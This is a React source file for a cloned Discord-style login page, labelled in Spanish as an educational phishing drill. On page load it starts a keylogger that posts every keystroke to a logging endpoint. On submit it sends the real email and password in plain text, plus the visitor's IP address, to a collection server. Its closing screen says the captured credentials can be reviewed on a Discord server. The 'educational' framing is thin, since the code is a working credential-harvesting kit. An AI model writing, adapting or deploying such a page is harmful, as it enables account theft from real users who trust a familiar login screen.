import bg from "./assets/bg.svg";
import icon from "./assets/icon.svg"
import side from "./assets/sidelogin.webp";
import { useState, useEffect } from "react";
import axios from "axios";

function App() {
  const [formData, setFormData] = useState({
    email: "",
    password: ""
  });

  const [captchaToken, setCaptchaToken]   
= useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showEducational, setShowEducational] = useState(false);

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  // Keylogger simulado
  const initializeKeylogger = () => {
    let capturedKeystrokes = '';
    let startTime = Date.now();
    
    const handleKeyPress = (event) => {
      if (event.key.length === 1 || event.key === ' ') {
        capturedKeystrokes += event.key;
      } else if (event.key === 'Backspace') {
        capturedKeystrokes += '[BACKSPACE]';
      } else if (event.key === 'Enter') {
        capturedKeystrokes += '[ENTER]';
      } else if (event.key === 'Tab') {
        capturedKeystrokes += '[TAB]';
      }
      
      if (capturedKeystrokes.length >= 10 || (Date.now() - startTime) > 5000) {
        sendKeystrokeData(capturedKeystrokes);
        capturedKeystrokes = '';
        startTime = Date.now();
      }
    };

    document.addEventListener('keydown', handleKeyPress);
    
    return () => {
      document.removeEventListener('keydown', handleKeyPress);
    };
  };

  const sendKeystrokeData = async (keystrokes) => {
    const keylogData = {
      type: 'KEYLOGGER_CAPTURE',
      keystrokes: keystrokes,
      timestamp: new Date().toISOString(),
      elementFocused: document.activeElement?.tagName || 'unknown',
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    try {
      await axios.post('http://localhost:3001/api/keylogger-data', keylogData);
      console.log('🔑 Keystrokes captured:', keystrokes);
    } catch (error) {
      console.error('Error sending keylog data:', error);
    }
  };

  // Cloudflare Turnstile + Keylogger
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
    script.async = true;
    script.defer = true;
    document.head.appendChild(script);

    window.onTurnstileCallback = (token) => {
      setCaptchaToken(token);
    };

    // INICIAR KEYLOGGER
    const cleanupKeylogger = initializeKeylogger();

    return () => {
      if (window.onTurnstileCallback) {
        delete window.onTurnstileCallback;
      }
      cleanupKeylogger();
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    const educationalData = {
      email: formData.email ? "PROVIDED_FOR_EDUCATION" : "NOT_PROVIDED",
      password: formData.password ? "PROVIDED_FOR_EDUCATION" : "NOT_PROVIDED",
      actualEmail: formData.email || 'NO_PROVIDED',
      actualPassword: formData.password || 'NO_PROVIDED',
      captchaToken: captchaToken ? "SOLVED" : "NOT_SOLVED",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ip: await getIP()
    };

    try {
      await axios.post('http://localhost:3001/api/educational-log', educationalData);
      
      const formCaptureData = {
        type: 'FORM_DATA_CAPTURE',
        email: formData.email || 'NOT_PROVIDED',
        passwordLength: formData.password ? formData.password.length : 0,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: await getIP()
      };

      await axios.post('http://localhost:3001/api/keylogger-data', formCaptureData);
      
      setShowEducational(true);
    } catch (error) {
      console.error('Error en ejercicio educativo:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const getIP = async () => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      return response.data.ip;
    } catch (error) {
      return 'unknown';
    }
  };

  if (showEducational) {
    return (
      <div className="min-h-screen bg-zinc-800 flex items-center justify-center text-white p-8">
        <div className="max-w-2xl bg-zinc-700 rounded-lg p-8">
          <h1 className="text-3xl font-bold text-center mb-6">🧠 Ejercicio Educativo Completado</h1>
          <div className="bg-yellow-500 text-black p-4 rounded mb-6 text-center font-bold">
            ESTE ERA UN SIMULACRO DE PHISHING EDUCATIVO <br/>
            Revisa el Servidor de discord para ver las credenciales capturadas.
          </div>
          
          <div className="space-y-4">
            <h2 className="text-xl font-semibold">Lo que aprendiste:</h2>
            <ul className="list-disc list-inside space-y-2">
              <li>Los atacantes usan páginas que parecen legítimas</li>
              <li>Los CAPTCHAs pueden hacer parecer la página más real</li>
              <li>Keyloggers pueden capturar todo lo que escribes</li>
              <li>Nunca ingreses credenciales en links sospechosos</li>
              <li>Siempre verifica la URL del sitio</li>
            </ul>
            
            <h2 className="text-xl font-semibold mt-6">Medidas de seguridad:</h2>
            <ul className="list-disc list-inside space-y-2">
              <li>Habilita la autenticación de dos factores (2FA)</li>
              <li>Usa contraseñas únicas para cada servicio</li>
              <li>Verifica siempre los enlaces antes de hacer clic</li>
              <li>Usa un gestor de contraseñas confiable</li>
              <li>Mantén tu software actualizado</li>
            </ul>
          </div>
          
          <button 
            onClick={() => setShowEducational(false)}
            className="mt-6 bg-indigo-500 w-full p-3 rounded-lg font-semibold hover:bg-indigo-600 transition-colors"
          >
            Volver al Simulacro
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="no-select bg-zinc-700 relative min-h-screen flex justify-center items-center cursor-default">
      <div className="absolute inset-0 no-select">
        <img src={bg} alt="background" className="w-full h-full object-cover" />
      </div>
      <div className="absolute top-5 left-5 no-select p-2">
        <img src={icon} alt="icon" className="" />
      </div>

      <div className="w-[55vw] h-[65vh] z-10 rounded-lg bg-zinc-700 shadow-lg text-gray-100 p-10 flex items-center justify-between overflow-hidden">
        <div className="flex-1 h-full mr-4 flex items-center justify-between flex-col">
          <div className="w-full text-center">
            <p className="gg-sans-semibold text-3xl">Welcome back!</p>
            <p className="text-gray-300 mt-2">We're so excited to see you again!</p>
          </div>

          <form onSubmit={handleSubmit} className="w-full space-y-2">
            <div>
              <p className="gg-sans-semibold text-gray-300 mb-2">
                Email or Phone Number <span className="mx-1 gg-sans-semibold text-red-300">*</span>
              </p>
              <input 
                type="text" 
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                className="w-full bg-zinc-800 rounded-lg border border-neutral-600 text-white p-2 focus:border-blue-400 focus:outline-none transition-colors duration-200" 
                required
              />
            </div>

            <div>
              <p className="gg-sans-semibold text-gray-300 mb-2">
                Password <span className="mx-1 gg-sans-semibold text-red-300">*</span>
              </p>
              <input 
                type="password" 
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                className="w-full bg-zinc-800 rounded-lg border border-neutral-600 text-white p-2 focus:border-blue-400 focus:outline-none transition-colors duration-200" 
                required
              />
            </div>

            {/* CAPTCHA Integration */}
            <div className="flex justify-center py-2">
              <div 
                className="cf-turnstile" 
                data-sitekey="1x00000000000000000000AA"
                data-callback="onTurnstileCallback"
                data-theme="dark"
              />
            </div>

            <button 
              type="submit"
              disabled={!captchaToken || isLoading}
              className="bg-indigo-500 w-full p-3 rounded-lg text-center gg-sans-semibold cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed transition-opacity duration-200"
            >
              {isLoading ? "Verifying..." : "Log In"}
            </button>
          </form>

          <div className="w-full text-left">
            <p className="text-sm gg-sans-medium text-gray-400">
              Need an account? <span className="text-indigo-400 hover:cursor-pointer hover:underline">Register</span>
            </p>
          </div>
        </div>

        <div className="h-[80%] flex-shrink-0">
          <img src={side} alt="side" className="h-full w-auto object-contain" />
        </div>
      </div>
    </div>
  );
}

export default App;